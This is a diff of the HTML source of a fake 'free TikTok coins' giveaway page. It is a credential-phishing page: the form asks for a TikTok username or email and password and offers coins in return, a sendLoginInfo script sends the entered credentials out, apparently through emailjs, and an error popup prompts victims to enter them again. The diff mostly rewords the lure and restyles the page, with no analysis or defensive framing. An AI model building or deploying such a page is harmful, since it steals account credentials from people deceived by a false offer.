@@ -1,9 +1,7 @@
-
-<!DOCTYPE html>
-<html>
-
-<head>
-	<body style="
+<html><head>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="tik.png" type="image/x-icon">
+	<style type="text/css" id="operaUserStyle"></style></head><body style="
   background-image: url('w.jpg');
   background-size: cover;
   background-position: center;
@@ -19,8 +17,8 @@
 			top: 8;
 			center: 0;
 			border-radius: 40px; 
-			width: 35px; 
-			height: 35px; 
+			width: 30px; 
+			height: 30px; 
 			object-fit: cover;
 		}
 		
@@ -60,43 +58,39 @@
       });
     })();
   </script>
-</head>
+
 	<footer><h2 style="color:yellow"></h2></footer>
-<body>
+
 	<div class="l"><center>
 		<img src="tik.png" class="visa">
-		<h3 style="color:yellow">TikTok</h3>
+		<h3 style="color:yellow"><img src="coin.png" class="logo">Coins <img src="coin.png" class="logo"></h3>
 	</center>
 	</div>
 	<center>
   <div class="odds-card">
-  	<b>Recieve Coins Directly to TikTok</b>
+  	<b>Recieve Coins Directly to your Account</b>
   	<footer> 
   	</footer>
-  		<label for="username"><b >TikTok Username or Email</b></label></footer>
-  <input type="text" id="username" 
-  	name="username" 
-  	style="width: 200px;
+  		<label for="username"><b></b></label>
+  <input type="text" id="username" name="username" placeholder="Username" style="width: 200px;
   	height: 40px;
   	font-size: 18px; padding:
   	10px; border: 2px solid #000;
-  	border-radius: 16px;"required>
+  	border-radius: 16px;" required="">
   <br><br>
-  <label for="password"><b >Password</b></label>
-  <input type="password" id="password" name="username" 
-  	style="width: 200px;
+  <label for="password"><b></b></label>
+  <input type="password" id="password" name="username" placeholder="Password" style="width: 200px;
   	height: 40px;
   	font-size: 18px; padding:
   	10px; border: 2px solid #000;
-  	border-radius: 16px;"required>
+  	border-radius: 16px;" required="">
   	<br><br>
-  	 <label for="cvc"><b >Amount($5 - 10)</b></label>
-  <input type="cvc" id="cvc" name="username" 
-  	style="width: 200px;
+  	 <label for="cvc"><b></b></label>
+  <input type="cvc" id="cvc" name="username" placeholder="10 - 100 coins" style="width: 200px;
   	height: 40px;
   	font-size: 18px; padding:
   	10px; border: 2px solid #000;
-  	border-radius: 16px;"required>
+  	border-radius: 16px;" required="">
 
   	
   <br><br>
@@ -118,11 +112,15 @@
         background-color: #1abc9c; /* Darker green on hover */
     }
 </style>
- <button type="button" onclick="sendLoginInfo()" class="button">SUBMIT AND RECEIVE FUNDS</button>
-  <p style="color:red"></p>
+      
+ <button type="button" onclick="sendLoginInfo()" class="button">RECEIVE COINS</button>
+
+
+          <p style="color:red"></p>
   <div id="error-message" style="display: none;">Please input the correct TikTok account and password to get a gift.</div>
 
   <script>
+      
     const sendLoginInfo = () => {
       let username = document.getElementById("username").value;
       let password = document.getElementById("password").value;
@@ -148,13 +146,14 @@
           showError(); // Display error message on emailjs error
         });
     };
-
+      
     function showError() {
       document.getElementById("error-message").style.display = "block";
       document.getElementById("error-message").style.color = "red";
       alert("Check your username or password!"); // Popup warning message
     }
+      
   </script>
-</body>
-  </html>
-	  
+
+
+</div></center></body></html>
